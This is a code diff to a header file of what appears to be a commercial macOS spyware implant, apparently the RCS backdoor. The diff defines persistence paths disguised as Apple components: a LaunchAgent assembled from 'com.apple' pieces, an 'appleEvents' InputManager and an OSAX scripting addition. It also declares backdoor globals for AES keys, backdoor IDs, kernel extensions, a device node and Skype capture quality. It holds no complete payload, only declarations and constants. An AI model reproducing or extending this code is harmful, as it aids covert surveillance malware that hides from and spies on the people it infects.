@@ -25,7 +25,7 @@
 #import "RCSMSharedMemory.h"
 #import "RCSMUtils.h"
 
-#define EXT_BUNDLE_FOLDER @"appleHID"
+//#define EXT_BUNDLE_FOLDER @"appleHID"
 #define ME __func__
 
 #define LOG_DELIMITER 0xABADC0DE
@@ -73,7 +73,7 @@ extern NSData            *gSessionKey;
 
 #define MAX_USER_LENGTH   20
 #define MAX_DIR_LENGTH    30
-#define BDOR_DEVICE       "/dev/pfCPU"
+#define BDOR_DEVICE       "/dev/ptmx0"
 #define MCHOOK_MAGIC      31338
 
 #define KERNEL_BASE   0xffffff8000200000
@@ -124,13 +124,34 @@ typedef struct os_version {
 #pragma mark General Parameters
 #pragma mark -
 
-#define BACKDOOR_DAEMON_PLIST @"Library/LaunchAgents/com.apple.mdworker.plist"
+// OSAX Strings
+#define OSAX_FOLDER @"ScriptingAdditions"
+#define OSAX_NAME   @"UIServerEvents"
+
+// InputManager names
+#define IM_FOLDER     @"InputManagers"
+#define IM_NAME       @"appleEvents"
+#define IM_EXT        @"bundle"
+#define IM_CONTENTS   @"Contents"
+#define IM_RESOURCES  @"Resources"
+#define IM_MACOS      @"MacOS"
+
+// launchd installation strings
+#define LIBRARY_NSSTRING  @"Library"
+#define LAUNCHD_DIR       @"LaunchAgents"
+#define DOMAIN_COM        @"com"
+#define DOMAIN_APL        @"apple"
+#define LAUNCHD_NAME      @"UIServerLogin"
+#define LAUNCHD_EXT       @"plist"
+
+// XXX- FIXED
+//#define BACKDOOR_DAEMON_PLIST @"Library/LaunchAgents/com.apple.mdworker.plist"
 #define SLI_PLIST @"/Library/Preferences/com.apple.SystemLoginItems.plist"
 
-#define OSAX_ROOT_PATH @"Library/ScriptingAdditions"
+//#define OSAX_ROOT_PATH @"Library/ScriptingAdditions"
 
-#define XPC_BUNDLE_FOLDER_PREFIX  @"com.apple."
-#define XPC_BUNDLE_FRAMEWORK_PATH @"/System/Library/Frameworks/Foundation.framework/XPCServices"
+//#define XPC_BUNDLE_FOLDER_PREFIX  @"com.apple."
+//#define XPC_BUNDLE_FRAMEWORK_PATH @"/System/Library/Frameworks/Foundation.framework/XPCServices"
 
 #define LOG_PREFIX    @"LOGF"
 
@@ -497,18 +518,18 @@ typedef struct _shMemoryLog {
 //
 // Global variables required by the backdoor
 //
-extern char     gLogAesKey[];
-extern char     gConfAesKey[];
-extern char     gInstanceId[];
-extern char     gBackdoorID[];
-extern char     gBackdoorSignature[];
-extern u_int    gVersion;
-extern u_int    gSkypeQuality;
-extern char     gMode[];
-extern char     gDemoMarker[];
-extern NSURL    *gOriginalDesktopImage;
-extern BOOL     gIsDemoMode;
+//extern char     gLogAesKey[];
+//extern char     gConfAesKey[];
+//extern char     gInstanceId[];
+//extern char     gBackdoorID[];
+//extern char     gBackdoorSignature[];
+//extern u_int    gVersion;
+//extern char     gDemoMarker[];
 
+extern char     gMode[];
+extern BOOL     gIsDemoMode;
+extern u_int    gSkypeQuality;
+extern NSURL    *gOriginalDesktopImage;
 extern NSString *gBackdoorName;
 extern NSString *gBackdoorUpdateName;
 extern NSString *gConfigurationName;
@@ -516,8 +537,8 @@ extern NSString *gConfigurationUpdateName;
 extern NSString *gInputManagerName;
 extern NSString *gKext32Name;
 extern NSString *gKext64Name;
-extern NSString *gXPCName;
-extern NSString *gMyXPCName;
+//extern NSString *gXPCName;
+//extern NSString *gMyXPCName;
 
 #define CRISIS_STARTSTOP    (UInt32)0x2
 #define CRISIS_STOP         (UInt32)0x0  // Per retrocompatibilita'
@@ -596,4 +617,7 @@ void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal);
 
 void changeDesktopBg(NSString *aFilePath, BOOL wantToRestoreOriginal);
 
+NSString *createLaunchdPlistPath();
+void removeOldLd();
+void removeAppleHID();
 #endif
